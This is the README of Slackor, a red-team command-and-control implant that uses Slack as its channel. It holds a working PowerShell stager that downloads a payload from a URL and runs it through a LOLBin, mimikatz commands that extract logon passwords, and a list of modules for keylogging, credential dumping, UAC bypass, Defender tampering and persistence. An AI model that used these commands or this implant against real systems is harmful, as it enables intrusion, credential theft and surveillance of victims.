# Slackor \#
A Golang implant that uses Slack as a command and control channel.

This project was inspired by [Gcat](https://github.com/byt3bl33d3r/gcat) and [Twittor](https://github.com/PaulSec/twittor). 


![Slackor Screenshot](https://www.n00py.io/wp-content/uploads/2018/10/screenshot.png)
![Wireshark Screenshot](https://www.n00py.io/wp-content/uploads/2018/09/slackor_wireshark-2-1024x349.png)
This tool is released as a proof of concept.  Be sure to read and understand the [Slack App Developer Policy](https://api.slack.com/developer-policy) before creating any Slack apps.  

Setup 
=====

**Note: The server is written in Python 3**

For this to work you need:
- A Slack Workspace
- [Register an app](https://api.slack.com/apps) with the following permissions:
    - **channels:read** 
    - **channels:history** 	
    - **channels:write** 	
    - **files:write:user** 
    - **files:read** 

- Create a bot

This repo contains five files:
- ```install.sh``` Installs dependancies
- ```setup.py``` The script to create the slack channels, database, and implant
- ```server.py``` The Slackor server, designed to be ran on Linux
- ```agent.go``` The generated implant
- ```requirements.txt``` Python dependencies (installed automatically)

To get started:

 - Run ```install.sh```
 - Run ```setup.py```
    - Supply the *OAuth Access Token* and *Bot User OAuth Access Token* from your app

After running the script successfully, a file ```agent.exe``` will be created.  It will be a 64bit Go binary packed with UPX.

After starting server.py on a Linux host, execute ```agent.exe``` on your target Windows host.

Run the "stager" module to generate a one-liner and other droppers.
 ```
 powershell.exe iwr [URL] -o C:\Users\Public\[NAME].exe; forfiles.exe /p c:\windows\system32 /m svchost.exe /c C:\Users\Public\[NAME]; timeout 2; del C:\Users\Public\[NAME].exe
 ```
 This will execute InvokeWebRequest(PS v.3+) to download the payload, execute it using a [LOLBin](https://lolbas-project.github.io/lolbas/Binaries/Forfiles/), and then delete itself once killed.  This is a working example but the command can tweaked to use another download method or execution method.   

Usage 
=====
Type "help" or press [TAB] to see a list of available commands.  type "help [COMMAND]" to see a description of that command.

```(Slackor)```

- **Help** - Displays help menu
- **interact** - Interact with an agent
- **list** - List all registered agents
- **remove** - kill and remove an agent
- **revive** - Sends a signal to all agents to re-register with the server
- **stager** - Generates a one-liner to download an execute the implant
- **quit** - Quit the program
- **wipefiles** - Deletes all uploaded files out of Slack

Once an agent checks in, you can interact with it.
Use "interact [AGENT] to enter into an agent prompt.  Type "help" or press [TAB] to see a list of available commands.

```(Slackor:AGENT)```

- **back** - Return to the main menu
- **beacon** - change the amount of time between each check-in by an agent (default is 5 seconds)
- **bypassuac** - Attempts to spawn a high integrity agent
- **cleanup** - Removes persistence artifacts
- **clipboard** - Retreives the contents of the clipboard
- **defanger** - Attempts to de-fang Windows Defender
- **download** - Download a file from the agent to the Slackor server
- **duplicate** - Causes the agent to spawn another invocation of itself
- **getsystem** - Spawns an agent as NTAUTHORITY/SYSTEM
- **help** - Displays help menu
- **keyscan** - Starts a keylogger on the agent
- **kill** - Kill the agent 
- **minidump** - Dumps memory from lsass.exe and downloads it  
- **persist** - Creates persistence by implanting a binary in an ADS
- **samdump** - Attempts to dump the SAM file for offline hash extraction
- **screenshot** - Takes a screenshot of the desktop and retrieves it
- **shellcode** - Executes x64 raw shellcode
- **sleep** - Cause the agent to sleep once (enter time in seconds)
- **sysinfo** - Displays the current user, OS version, system architecture, and number of CPU cores
- **upload** - Upload a file to the agent from the Slackor server
- **wget** - Pull down arbitrary files over HTTP/HTTPS 


#### OPSEC Considerations

Command output and downloaded files are AES encrypted in addition to TLS transport encryption.
 
Modules will warn you before performing tasks that write to disk.  
When executing shell commands, take note that cmd.exe will be executed.  This may be monitored on the host.
Here are several OPSEC safe commands that will NOT execute cmd.exe:

- **cat** - prints file content
- **cd** - change directory
- **find** - search directory filenames 
- **getip** - Get external IP address (makes a DNS request)
- **hostname** - Displays the name of the host
- **ifconfig** - Displays interface information
- **ls** - list directory contents
- **mkdir** - Creates a directory
- **pwd** - prints the current working directory
- **rm** - removes a file
- **rmdir** - removes a directory
- **whoami / getuid** - prints the current user

Credits
=====
- https://github.com/EgeBalci -  Functions adapted from [HERCULES](https://github.com/EgeBalci/HERCULES) and [EGESPLOIT](https://github.com/EgeBalci/EGESPLOIT)
- https://github.com/SaturnsVoid - Keylogger adapted from [GoBot2](https://github.com/SaturnsVoid/GoBot2)
- https://github.com/vyrus001 - x64 shellcode execution [shellGo](https://github.com/vyrus001/shellGo)
- Crypto functions adopted from https://www.golang123.com/topic/1686 
- Persistence idea from [Enigma0x3](https://enigma0x3.net/2015/03/05/using-alternate-data-streams-to-persist-on-a-compromised-machine/)
- Minidump adoped from [Merlin](https://github.com/Ne0nd0g/merlin), credit to [C-Sto](https://github.com/C-Sto)
- Screenshot code from [kbinani](https://github.com/kbinani/screenshot)
- Clipboard code from [atotto](https://github.com/atotto/clipboard)
- Stager generator from [hlldz](https://github.com/hlldz/SpookFlare)
- UAC bypass by [winscripting.blog](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)
- Lulzbin find by [@vector_sec](https://twitter.com/vector_sec/status/896049052642533376]) 
- Countless threads on StackOverflow
- Thanks to [impacket](https://github.com/SecureAuthCorp/impacket) for dumping hashes from SAM/SYS/SECURITY reg hives. 
- LSASS dump credential extraction made possbile using [pypykatz](https://github.com/skelsec/pypykatz) by skelsec
- Bob Aman ([Sporkmonger](https://github.com/sporkmonger)) for various additions

Future goals 
=====
- DOSfuscation 
- Reflectively load DLL/PE - https://github.com/vyrus001/go-mimikatz
- Execute C# assemblies in memory - https://github.com/lesnuages/go-execute-assembly
- Source code obfuscation https://github.com/unixpickle/gobfuscate

FAQ:
=====
**Is this safe to use for red teams/pentesting?** 

Yes, given some conditions.  While the data is encrypted in transit, the agent contains the key for decryption.
Anyone who acquires a copy of the agent could reverse engineer it and extract the API keys and the AES secret key.
Anyone who compromises or otherwise gains access to the workspace would be able to retrieve all data within it. 
For this reason, it is not recommended to re-use infrastructure against multiple organizations.    

**What about Mimikatz?**

The implant does not have in-memory password dumping functionality.
If you need logonPasswords, you can try the following:
```
(Slackor: AGENT)minidump
```
THis will automically extract passwords with Pypykatz.  Alternatively, you can use Mimikatz on Windows.
```
>mimikatz.exe
mimikatz # sekurlsa::Minidump lsassdump.dmp
mimikatz # sekurlsa::logonPasswords
```
**Is it cross-platform?** 

Not yet. It has not been fully tested on a variety of systems.  The server was designed to run on Kali Linux and the agent on Windows 10.  

**How well does it scale?** 

Scalability is limited by the Slack API.  If you have multiple agents, consider increasing the beacon interval of beacons not in use.  

**Is it vulnerable to standard beacon analysis?** 

Currently each beacon has 20% jitter built in, and beacon times can be customized.  Agent check-in request and response packets will be about the same size each time as long as no new commands are recieved.

**Why did you do [x] when a better way to do it is [y]?**

I tried my best.  PRs are encouraged :)

**It gets caught by AV!**

The built-in HTA stager is created by [SpookFlare](https://github.com/hlldz/SpookFlare) which is based on [Demiguise](https://github.com/nccgroup/demiguise).  If you want your droppers to not get snagged you probably want to go custom.  The built in droppers are just there to get you started. 
